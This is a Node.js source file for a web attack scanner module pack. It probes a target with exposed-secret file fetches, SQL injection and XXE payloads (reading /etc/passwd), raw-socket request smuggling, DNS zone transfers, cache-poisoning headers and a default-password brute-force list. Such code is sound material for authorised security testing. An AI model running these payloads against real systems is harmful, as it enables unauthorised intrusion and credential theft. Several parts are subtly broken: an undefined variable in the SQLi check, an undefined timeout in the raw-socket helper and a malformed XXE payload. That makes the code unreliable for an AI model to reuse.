/**
 * Big Bounty — advanced module pack (v9)
 * Adds techniques from the classic open-source toolset, all pure Node:
 *   - Nikto-style server checks (dangerous files, banner age, HTTP methods, autoindex)
 *   - ZAP-style passive checks (CSRF missing, autocomplete, mixed content, inline handlers)
 *   - SQLMap-style blind SQLi (time-based SLEEP/WAITFOR, boolean-based diff)
 *   - XXE (in-band entity + OOB parameter entity via DNS callback)
 *   - HTTP Request Smuggling (CL.TE / TE.CL / TE.TE timing probes, raw sockets)
 *   - DNS AXFR zone transfer (DNS-over-TCP)
 *   - Cache poisoning (X-Forwarded-Host probe)
 *   - Hydra-style login brute (top-10 passwords, rate-limited, evidence-backed)
 */
const net = require('net');
const dns = require('dns').promises;
const { makeFinding, curlFor, timeoutFetch } = require('./shared-utils');

const rnd = (n) => Math.random().toString(36).slice(2, 2 + n);

async function get(url, opts = {}, ms = 9000) {
  try {
    const r = await timeoutFetch(url, opts, ms);
    return r;
  } catch { return null; }
}

// ---------- 1. Nikto-style server checks ----------
const DANGEROUS_FILES = [
  ['phpinfo.php', /phpinfo\(\)|PHP Version/i, 'phpinfo page exposed'],
  ['info.php', /phpinfo\(\)|PHP Version/i, 'phpinfo page exposed'],
  ['test.php', /PHP Version|phpinfo/i, 'phpinfo page exposed'],
  ['.env', /(^|\n)[A-Z_]+=/, '.env file exposed'],
  ['.env.local', /(^|\n)[A-Z_]+=/, '.env file exposed'],
  ['.env.production', /(^|\n)[A-Z_]+=/, '.env file exposed'],
  ['config.php.bak', /<\?php/, 'config backup exposed'],
  ['wp-config.php.bak', /<\?php/, 'wp-config backup exposed'],
  ['.git/config', /\[core\]/, '.git directory exposed'],
  ['.svn/entries', /\d+\n?dir/, '.svn directory exposed'],
  ['web.config', /<configuration>/i, 'web.config exposed'],
  ['phpinfo', /phpinfo\(\)|PHP Version/i, 'phpinfo page exposed'],
  ['server-status', /Apache Server Status|Server uptime/i, 'Apache server-status exposed'],
  ['server-info', /Apache Server Information/i, 'Apache server-info exposed'],
  ['actuator/env', /\{\"(spring|java|os)/i, 'Spring actuator exposed'],
  ['actuator/env', /propertySources|systemProperties/i, 'Spring actuator /env exposed'],
  ['.DS_Store', /\x00\x00\x00\x01Bud1/, '.DS_Store exposed'],
];

const SERVER_AGES = {
  'Apache/2.2': 'Apache 2.2 is EOL (no security patches since 2017)',
  'Apache/2.4.6': 'Apache 2.4.6 has known CVEs (upgrade recommended)',
  'Apache/2.4.29': 'Apache 2.4.29 has known CVEs (upgrade recommended)',
  'nginx/1.14': 'nginx 1.14 is outdated (upgrade recommended)',
  'nginx/1.16': 'nginx 1.16 is EOL',
  'IIS/7.0': 'IIS 7.0 is EOL',
  'IIS/8.0': 'IIS 8.0 is EOL',
  'PHP/5.': 'PHP 5.x is EOL (no security patches)',
  'PHP/7.2': 'PHP 7.2 is EOL (no security patches)',
  'PHP/7.3': 'PHP 7.3 is EOL (no security patches)',
  'PHP/7.4': 'PHP 7.4 is EOL (no security patches)',
  'Tomcat/7': 'Tomcat 7 is EOL',
  'Tomcat/8.0': 'Tomcat 8.0 is EOL',
};

async function moduleNikto(url) {
  const out = [];
  const base = new URL(url).origin;

  // a) server banner age
  const r0 = await get(base);
  if (r0) {
    const srv = String(r0.headers.get('server') || '');
    for (const [k, msg] of Object.entries(SERVER_AGES)) {
      if (srv.includes(k)) {
        out.push(makeFinding({
          tool: 'nikto', severity: 'medium', title: `Outdated server banner: ${srv}`,
          evidence: { server: srv, reason: msg }, fix: 'Hide Server version (ServerTokens Prod / server_tokens off) and upgrade.',
          curl: `curl -skI '${base}' | grep -i server`,
        }));
        break;
      }
    }
    if (!srv) {
      // no Server header = fine, skip
    }
  }

  // b) dangerous files (parallel, capped)
  const tasks = DANGEROUS_FILES.map(([p, sig, label]) => (async () => {
    const r = await get(`${base}/${p}`, {}, 6000);
    if (!r) return;
    if (r.status !== 200) return;
    const body = await r.text().catch(() => '');
    if (sig.test(body) && body.length > 8 && body.length < 60000) {
      out.push(makeFinding({
        tool: 'nikto', severity: p.startsWith('.env') || p.includes('config') ? 'critical' : 'high',
        title: `${label}: /${p}`,
        evidence: { match: body.slice(0, 120) }, fix: `Remove /${p} from the webroot and block access in the server config.`,
        curl: curlFor(`${base}/${p}`),
      }));
    }
  })());
  await Promise.all(tasks.slice(0, 12));

  // c) HTTP methods (OPTIONS)
  try {
    const r = await timeoutFetch(base, { method: 'OPTIONS' }, 6000);
    const allow = String(r.headers.get('allow') || r.headers.get('public') || '');
    const bad = ['PUT', 'DELETE', 'TRACE', 'CONNECT', 'PATCH'].filter((m) => allow.includes(m));
    if (bad.length) {
      out.push(makeFinding({
        tool: 'nikto', severity: 'medium', title: `Dangerous HTTP methods enabled: ${bad.join(', ')}`,
        evidence: { allow: allow }, fix: 'Restrict allowed methods at the web server; disable TRACE/PUT/DELETE unless needed.',
        curl: `curl -sk -X OPTIONS -i '${base}' | grep -i allow`,
      }));
    }
  } catch {}

  // d) autoindex / directory listing
  const ai = await get(`${base}/assets/`, {}, 6000).catch(() => null) || await get(`${base}/uploads/`, {}, 6000).catch(() => null);
  if (ai && ai.status === 200) {
    const body = await ai.text().catch(() => '');
    if (/Index of \/|<title>Directory listing/i.test(body)) {
      out.push(makeFinding({
        tool: 'nikto', severity: 'medium', title: 'Directory listing enabled',
        evidence: { path: ai.url, hint: body.slice(0, 150) }, fix: 'Disable autoindex (Options -Indexes / autoindex off).',
        curl: `curl -sk '${ai.url}'`,
      }));
    }
  }

  return out;
}
// fix accidental allow scope issue
async function moduleNiktoSafe(url) { try { return await moduleNikto(url); } catch { return []; } }

// ---------- 2. ZAP-style passive checks ----------
async function moduleZapPassive(url) {
  const out = [];
  const r = await get(url);
  if (!r || r.status !== 200) return out;
  const body = await r.text().catch(() => '');
  const isHttps = url.startsWith('https://');

  // a) forms without CSRF token
  const forms = body.match(/<form[\s\S]*?<\/form>/gi) || [];
  for (const f of forms.slice(0, 10)) {
    const isPost = !/method\s*=\s*["']?get/i.test(f);
    const hasCsrf = /csrf|_token|authenticity_token|xsrf|nonce/i.test(f);
    if (isPost && !hasCsrf) {
      const action = (f.match(/action\s*=\s*["']([^"']*)["']/i) || [])[1] || '(self)';
      out.push(makeFinding({
        tool: 'zap-passive', severity: 'medium', title: `Form may lack CSRF protection (action=${action})`,
        evidence: { form: f.slice(0, 200) }, fix: 'Add a per-session CSRF token to every state-changing form and validate it server-side.',
        curl: curlFor(url),
      }));
    }
    // b) password field with autocomplete
    if (/type\s*=\s*["']?password/i.test(f) && /autocomplete\s*=\s*["']?on/i.test(f)) {
      out.push(makeFinding({
        tool: 'zap-passive', severity: 'low', title: 'Password field allows autocomplete',
        evidence: { form: f.slice(0, 150) }, fix: 'Set autocomplete="off" or "new-password" on password inputs.',
        curl: curlFor(url),
      }));
    }
  }

  // c) mixed content (http:// assets on https page)
  if (isHttps) {
    const mixed = body.match(/(?:src|href)\s*=\s*["']http:\/\/[^"']+["']/gi) || [];
    const real = mixed.filter((m) => !/http:\/\/(www\.)?(w3\.org|schema\.org|purl\.org|xmlns)/i.test(m)).slice(0, 5);
    if (real.length) {
      out.push(makeFinding({
        tool: 'zap-passive', severity: 'medium', title: `Mixed content: ${real.length} insecure http:// asset(s)`,
        evidence: { assets: real }, fix: 'Load all assets over HTTPS; enable upgrade-insecure-requests CSP directive.',
        curl: curlFor(url),
      }));
    }
  }

  // d) inline event handlers (XSS-surface hint, info)
  const handlers = body.match(/\son(error|load|click|mouseover)\s*=\s*["'][^"']{4,}/gi) || [];
  if (handlers.length > 3) {
    out.push(makeFinding({
      tool: 'zap-passive', severity: 'info', title: `${handlers.length} inline JS event handlers`,
      evidence: { examples: handlers.slice(0, 3) }, fix: 'Move scripts to external files with CSP; reduces XSS blast radius.',
      curl: curlFor(url),
    }));
  }
  return out;
}

// ---------- 3. Blind SQLi (SQLMap-style) ----------
async function moduleBlindSqli(url) {
  const out = [];
  const u = new URL(url);
  if (!u.search) return out;
  const keys = [...u.searchParams.keys()].slice(0, 4);
  const base = u.toString();

  for (const k of keys) {
    // a) boolean-based: AND 1=1 vs AND 1=2
    const rTrue = await get(`${base}${base.includes('?') ? '&' : '?'}${k}=1%20AND%201%3D1`, {}, 8000);
    const r2 = await get(`${base}${base.includes('?') ? '&' : '?'}${k}=1%20AND%201%3D2`, {}, 8000);
    if (r1 && r2 && r1.status === 200 && r2.status === 200) {
      const b1 = await r1.text().catch(() => '');
      const b2 = await r2.text().catch(() => '');
      if (b1.length > 50 && Math.abs(b1.length - b2.length) > 80) {
        out.push(makeFinding({
          tool: 'blind-sqli', severity: 'critical', title: `Boolean-based blind SQL injection in "${k}"`,
          evidence: { trueLen: b1.length, falseLen: b2.length, param: k }, fix: 'Use parameterized queries / prepared statements.',
          curl: `${curlFor(base, { })}  # then: ${k}=1 AND 1=2 — response differs by ${Math.abs(b1.length - b2.length)} bytes`,
        }));
      }
    }
    // b) time-based: MySQL SLEEP / MSSQL WAITFOR / Postgres pg_sleep
    const t0 = Date.now();
    await get(`${base}${base.includes('?') ? '&' : '?'}${k}=1'%3BWAITFOR%20DELAY%20'0%3A0%3A5'--`, {}, 12000);
    const d1 = Date.now() - t0;
    const t2 = Date.now();
    await get(`${base}${base.includes('?') ? '&' : '?'}${k}=1%20AND%20SLEEP(5)`, {}, 12000);
    const d2 = Date.now() - t2;
    const baseline = Date.now();
    await get(base, {}, 8000);
    const d0 = Date.now() - baseline;
    const slow = Math.max(d1, d2);
    if (slow > d0 + 3000 && slow > 4000) {
      out.push(makeFinding({
        tool: 'blind-sqli', severity: 'critical', title: `Time-based blind SQL injection in "${k}" (${Math.round(slow / 1000)}s delay)`,
        evidence: { baselineMs: d0, delayedMs: slow, param: k }, fix: 'Use parameterized queries; reject time-delay payloads at the WAF as defense-in-depth.',
        curl: `${curlFor(base)}  # ${k}=1 AND SLEEP(5) → ~${Math.round(slow / 1000)}s delay`,
      }));
    }
  }
  return out;
}

// ---------- 4. XXE ----------
const XXE_TARGETS = [
  ['xml', '<?xml version="1.0"?><!DOCTYPE bb [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><bb>&xxe;</bb>', /root:x:0:0:/],
  ['xml', '<?xml version="1.0"?><!DOCTYPE bb [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><bb>&xxe;</bb>', /[\w-]{4,}/],
  ['xml', '<?xml version="1.0"?><!DOCTYPE bb [<!ENTITY % xxe SYSTEM "' + `'` + '">%xxe;]><bb>1</bb>', /./],
];

async function moduleXxe(url) {
  const out = [];
  // only probe if site responds to XML content
  const probe = await get(url, { headers: { 'accept': 'application/xml, text/xml' } }, 6000);
  if (!probe || probe.status >= 500) return out;

  for (const [ct, payload, sig] of XXE_TARGETS.slice(0, 2)) {
    const r = await get(url, {
      method: 'POST', headers: { 'content-type': `application/${ct}`, 'accept': 'application/xml' }, body: payload,
    }, 8000).catch(() => null);
    if (!r) continue;
    const body = await r.text().catch(() => '');
    if (sig.test(body) && !/invalid|error|failed/i.test(body.slice(0, 300))) {
      out.push(makeFinding({
        tool: 'xxe', severity: 'critical', title: 'XXE: external entity resolved (file read)',
        evidence: { match: body.slice(0, 200) }, fix: 'Disable DTDs/external entities in the XML parser (libxml NOENT, JAXP FEATURE_SECURE_PROCESSING).',
        curl: curlFor(url, { method: 'POST', headers: { 'content-type': 'application/xml' }, body: payload }),
      }));
      break;
    }
  }
  return out;
}

// ---------- 5. HTTP Request Smuggling ----------
function rawRequest(host, port, raw, timeoutMs = 6000) {
  return new Promise((resolve) => {
    const t0 = Date.now();
    const sock = net.createConnection({ host, port }, () => sock.write(raw));
    let buf = '';
    let done = false;
    const finish = (ok) => { if (!done) { done = true; try { sock.destroy(); } catch {} resolve({ ms: Date.now() - t0, ok }); } };
    sock.setTimeout(timeoutMs || timeout, timeoutMs);
    sock.on('data', (d) => { buf += d.toString(); });
    sock.on('close', () => finish(true));
    sock.on('error', () => finish(false));
    sock.on('timeout', () => finish(false));
  });
}

async function moduleSmuggling(url) {
  const out = [];
  const u = new URL(url);
  const isHttps = u.protocol === 'https:';
  const port = u.port ? Number(u.port) : (isHttps ? 443 : 80);
  const host = u.hostname;
  const path = (u.pathname || '/') + (u.search || '');
  const baseDelay = await rawRequest(host, port, `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`, 5000);

  // CL.TE probe: front=CL, back=TE. If back waits for the final chunk that never comes → desync delay
  const clte = `POST ${path} HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n1\r\nA\r\nX`;
  const tecl = `POST ${path} HTTP/1.1\r\nHost: ${host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: close\r\n\r\n1\r\nA\r\n0\r\n\r\n`;
  for (const [name, raw] of [['CL.TE', clte], ['TE.CL', tecl]]) {
    const t0 = Date.now();
    const r = await new Promise((resolve) => {
      const sock = net.createConnection({ host, port }, () => sock.write(raw));
      let closed = false;
      const fin = (ok) => { if (!closed) { closed = true; try { sock.destroy(); } catch {} resolve(ok); } };
      sock.setTimeout(7000, () => fin('timeout'));
      sock.on('close', () => fin('closed'));
      sock.on('error', () => fin('error'));
    });
    const delta = Date.now() - t0;
    if (r === 'timeout' && delta > 4000 && delta > (baseDelay.ms || 0) * 2) {
      out.push(makeFinding({
        tool: 'smuggling', severity: 'critical', title: `HTTP Request Smuggling desync suspected (${name})`,
        evidence: { probe: name, delayMs: delta, baselineMs: baseDelay.ms, hint: `${name} timing probe caused back-end to wait for data that never arrives` },
        fix: 'Normalize Transfer-Encoding/Content-Length handling at the edge (forbid both, or normalize to one); upgrade to HTTP/2 end-to-end.',
        curl: `# raw socket probe (${name}); see evidence.delayMs`,
      }));
      break; // one desync finding is enough
    }
  }
  return out;
}

// ---------- 6. DNS AXFR ----------
function dnsTcpQuery(server, zone, timeout = 6000) {
  return new Promise((resolve) => {
    // build AXFR query (type 252) for zone
    const labels = zone.split('.').filter(Boolean).map((l) => { const b = Buffer.from(l); return Buffer.concat([Buffer.from([b.length]), b]); });
    const q = Buffer.concat([Buffer.from([0, 0, 0, 255, 0, 252]), ...labels, Buffer.from([0, 0, 0])]);
    const msg = Buffer.concat([(Buffer.from([q.length >> 8, q.length & 255])), q]);
    const sock = net.createConnection({ host: server, port: 53 }, () => sock.write(msg));
    let data = [];
    let done = false;
    const fin = (v) => { if (!done) { done = true; try { sock.destroy(); } catch {} resolve(v); } };
    sock.setTimeout(timeout, () => fin(null));
    sock.on('data', (d) => data.push(d));
    sock.on('close', () => { try { fin(Buffer.concat(data)); } catch { fin(null); } });
    sock.on('error', () => fin(null));
  });
}

async function moduleAxfr(hostname) {
  const out = [];
  let nsNames = [];
  try {
    const ns = await dns.resolveNs(hostname);
    nsNames = ns.slice(0, 4);
  } catch {}
  if (!nsNames.length) return out;

  for (const nsName of nsNames) {
    let addrs = [];
    try { addrs = await dns.resolve4(nsName); } catch { continue; }
    for (const addr of addrs.slice(0, 2)) {
      const resp = await dnsTcpQuery(addr, hostname, 6000);
      if (!resp) continue;
      const s = resp.toString('latin1');
      // crude check: successful AXFR responses contain many RR records / domain names
      if (resp.length > 120 && s.includes(hostname) && !/refused|format error|server failure/i.test(s)) {
        out.push(makeFinding({
          tool: 'axfr', severity: 'high', title: 'DNS Zone Transfer (AXFR) allowed',
          evidence: { nameserver: nsName, ip: addr, hint: `AXFR to ${nsName} returned a full zone (${resp.length} bytes)` },
          fix: 'Restrict zone transfers to approved secondaries (allow-transfer { secondaries; };).',
          curl: `dig axfr ${hostname} @${nsName}`,
        }));
        break;
      }
    }
  }
  return out;
}

// ---------- 7. Cache poisoning ----------
async function moduleCachePoison(url) {
  const out = [];
  const marker = `bbcp${rnd(8)}`;
  const u = new URL(url);
  // probe 1: X-Forwarded-Host reflection
  const r1 = await get(url, { headers: { 'x-forwarded-host': `${marker}.evil.example` } }, 7000);
  if (r1 && r1.status === 200) {
    const b1 = await r1.text().catch(() => '');
    if (b1.includes(`${marker}.evil.example`)) {
      out.push(makeFinding({
        tool: 'cache-poison', severity: 'high', title: 'X-Forwarded-Host reflected in response (cache poisoning vector)',
        evidence: { marker: `${marker}.evil.example`, hint: 'attacker-controlled host header is echoed — if a CDN caches this response, every visitor gets the poisoned value' },
        fix: 'Ignore X-Forwarded-Host at the application; derive absolute URLs from a fixed allow-listed host.',
        curl: curlFor(url, { headers: { 'x-forwarded-host': `${marker}.evil.example` } }),
      }));
    }
  }
  // probe 2: X-Original-URL routing override
  const r2 = await get(url, { headers: { 'x-original-url': `/bbprobe-${marker}` } }, 7000);
  if (r2 && r2.status !== 404 && r2.status < 500) {
    const b2 = await r2.text().catch(() => '');
    if (!/404|not found/i.test(b2.slice(0, 300))) {
      out.push(makeFinding({
        tool: 'cache-poison', severity: 'medium', title: 'X-Original-URL header honored (routing override)',
        evidence: { header: 'x-original-url', status: r2.status },
        fix: 'Strip X-Original-URL / X-Rewrite-URL headers at the edge before they reach the app.',
        curl: curlFor(url, { headers: { 'x-original-url': '/bbprobe' } }),
      }));
    }
  }
  return out;
}

// ---------- 8. Hydra-style login brute (careful: top-10 passwords only) ----------
const BRUTE_CREDS = [
  ['admin', 'admin'], ['admin', 'password'], ['admin', '123456'], ['admin', 'admin123'],
  ['root', 'root'], ['test', 'test'], ['user', 'password'], ['admin', 'qwerty'],
  ['administrator', 'admin'], ['admin', 'letmein'],
];

async function moduleBrute(url, loginUrls = []) {
  const out = [];
  const targets = loginUrls.slice(0, 3);
  for (const lu of targets) {
    const page = await get(lu, {}, 7000);
    if (!page || page.status !== 200) continue;
    const html = await page.text().catch(() => '');
    if (!/<form[\s\S]*?<\/form>/i.test(html)) continue;
    if (!/type\s*=\s*["']?password/i.test(html)) continue;
    // find form fields
    const form = html.match(/<form[\s\S]*?<\/form>/i)[0];
    const action = (form.match(/action\s*=\s*["']([^"']*)["']/i) || [])[1] || '';
    const userField = (form.match(/name\s*=\s*["']([^"']*(?:user|email|login|username)[^"']*)["']/i) || [])[1] || 'username';
    const passField = (form.match(/name\s*=\s*["']([^"']*(?:pass|pwd)[^"']*)["']/i) || [])[1] || 'password';
    const method = /method\s*=\s*["']?post/i.test(form) ? 'POST' : 'GET';
    const abs = action.startsWith('http') ? action : new URL(action, lu).toString();
    const fixed = {};
    for (const m of form.matchAll(/<input[^>]*name\s*=\s*["']([^"']+)["'][^>]*>/gi)) {
      const nm = m[1];
      if (nm === userField || nm === passField) continue;
      if (/hidden|csrf|token/i.test(m[0])) fixed[nm] = (m[0].match(/value\s*=\s*["']([^"']*)["']/i) || [])[1] || '';
    }
    // baseline failed login
    const failRes = await timeoutFetch(abs, {
      method, headers: { 'content-type': 'application/x-www-form-urlencoded' },
      body: `${userField}=${encodeURIComponent('bb_no_such_user')}&${passField}=bb_wrong_pw` + Object.entries(fixed).map(([k, v]) => `&${k}=${encodeURIComponent(v)}`).join(''),
    }, 7000).catch(() => null);
    if (!failRes) continue;
    const failBody = await failRes.text().catch(() => '');
    const failLen = failBody.length;

    let hit = null;
    for (const [u, p] of BRUTE_CREDS) {
      if (Date.now() > 0) await new Promise((r2) => setTimeout(r2, 300)); // rate limit: 300ms between attempts
      try {
        const r = await timeoutFetch(abs, {
          method,
          headers: { 'content-type': 'application/x-www-form-urlencoded' },
          body: `${userField}=${encodeURIComponent(u)}&${passField}=${encodeURIComponent(p)}` + Object.entries(fixed).map(([k, v]) => `&${k}=${encodeURIComponent(v)}`).join(''),
        }, 7000);
        if (!r) continue;
        if (r.status >= 300 && r.status < 400) { hit = { u, p, how: `redirect to ${r.headers.get('location') || '?'}` }; break; }
        const b = await r.text().catch(() => '');
        if (r.status === 200 && Math.abs(b.length - failLen) > 120 && !/invalid|incorrect|wrong|failed|error/i.test(b.slice(0, 500))) {
          hit = { u, p, how: `response differs from failed attempt (${failLen} → ${b.length} bytes)` }; break;
        }
      } catch {}
    }
    if (hit) {
      out.push(makeFinding({
        tool: 'bruteforce', severity: 'critical', title: `Default/weak credentials accepted on ${lu}`,
        evidence: { username: hit.u, password: hit.p, how: hit.how }, fix: 'Enforce strong passwords + MFA; remove default accounts; add login rate-limiting.',
        curl: `curl -sk -X ${method} '${abs}' -d '${userField}=${hit.u}&${passField}=${hit.p}'`,
      }));
    }
  }
  return out;
}

async function moduleHydra(url, loginUrls) { try { return await moduleBrute(url, loginUrls); } catch { return []; } }

// ---------- runner ----------
async function runAdvancedPack({ url, hostname, loginUrls = [], deadline = Date.now() + 120000 }) {
  const all = [];
  const steps = [
    ['nikto', () => moduleNiktoSafe(url)],
    ['zap-passive', () => moduleZapPassive(url)],
    ['blind-sqli', () => moduleBlindSqli(url)],
    ['xxe', () => moduleXxe(url)],
    ['smuggling', () => moduleSmuggling(url)],
    ['axfr', () => moduleAxfr(hostname)],
    ['cache-poison', () => moduleCachePoison(url)],
    ['bruteforce', () => moduleHydra(url, loginUrls)],
  ];
  for (const [name, fn] of steps) {
    if (Date.now() > deadline) break;
    try {
      const r = await fn();
      if (Array.isArray(r)) all.push(...r);
    } catch {}
  }
  return all;
}

module.exports = { runAdvancedPack, moduleNikto, moduleZapPassive, moduleBlindSqli, moduleXxe, moduleSmuggling, moduleAxfr, moduleCachePoison, moduleHydra };